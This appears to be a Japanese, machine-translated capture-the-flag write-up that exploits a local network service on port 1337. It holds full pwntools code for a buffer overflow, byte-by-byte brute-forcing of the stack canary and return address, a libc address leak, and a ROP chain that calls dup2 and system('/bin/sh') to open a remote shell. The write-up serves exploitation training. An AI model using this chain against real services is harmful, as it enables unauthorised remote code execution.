1.バッファオーバーフロー


以下に示すように、56バイトを送信すると、プログラムは正常に動作し続けますが、57バイトを送信すると、例外が発生します。したがって、バッファの整合性が損なわれます。



エクスプロイトテンプレートを作成しましょう。たくさん並べ替えて再接続する必要があるため、pwntools（log_level）メッセージの出力を無効にします。

#!/usr/bin/python3
from pwn import *

HOST = '127.0.0.1'
PORT = 1337
context(os = "linux", arch = "amd64", log_level='error')

pre_payload = "A" * 56

r = remote(HOST, PORT)

context.log_level='info'
r.interactive()

2.Canary、RBP、RIP


私たちが理解したように、56バイトのバッファーの後にカナリアがあり、その後にスタック内にRBPおよびRIPアドレスがあり、これらもソートする必要があります。8バイトのマッチング関数を書いてみましょう。

def qword_brute(pre_payload, item):
    qword_ = b""
    while len(qword_) < 8:
        for b in range(256):
            byte = bytes([b])
            try:
                r = remote(HOST, PORT)
                print(f"{item} find: {(qword_ + byte).hex()}", end=u"\u001b[1000D")
                send_ = pre_payload + qword_ + byte
                r.sendafter(b"admin:", send_)
                if b"Done" not in r.recvall(timeout=5):
                    raise EOFError
                r.close()
                qword_ += byte
                break
            except EOFError as error:
                r.close()
    context.log_level='info'            
    log.success(f"{item} found: {hex(u64(qword_))}")
    context.log_level='error' 
    return qword_

したがって、pre_payloadを作成できます。

pre_payload = b"A" * 56
CANARY = qword_brute(pre_payload, "CANARY")
pre_payload += CANARY
RBP = qword_brute(pre_payload, "RBP")
pre_payload += RBP
RIP = qword_brute(pre_payload, "RIP")

4.メモリリーク


アプリケーションは標準のwrite（）関数を使用して、出力へのハンドル、バッファ、およびそのサイズを取得するプロンプト文字列を表示します。この機能を利用できます。

便宜上、pwntoolsのROPモジュールを使用してみましょう。簡単に言えば、これがどのようにそしてなぜ機能するかは、下の画像に示されています。



リークを取得しましょう。これにより、ロードされたlibcライブラリの書き込み関数のアドレスがわかります。

rop_binary = ROP(binary)
rop_binary.write(0x4, binary.got['write'], 0x8)
send_leak = pre_payload + flat(rop_binary.build())

r = remote(HOST, PORT)
r.sendafter(b"admin:", send_leak)
leak = r.recvall().strip().ljust(8, b'\x00')
print(f"Leak: {hex(u64(leak))}")
base_libc = leak - libc.symbols['write']

5.ROP


libcライブラリーのベース・アドレスを変更して、行/ bin / shのアドレスを見つけましょう。

libc.address = base_libc
shell_address = next(libc.search(b"/bin/sh\x00"))

それはROPを収集するために残り、標準I / O記述子（0、1、2）はプログラムに登録されている記述子にリダイレクトされます（4）。その後、システム関数が呼び出され、行/ bin / shのアドレスを渡します。

rop_libc = ROP(libc)
rop_libc.dup2(4, 0)
rop_libc.dup2(4, 1)
rop_libc.dup2(4, 2)
rop_libc.system(shell_address)

payload = pre_payload + flat(rop_libc.build())

r = remote(HOST, PORT)
r.sendafter(b"admin:", payload)
time.sleep(2)
r.sendline(b"id")
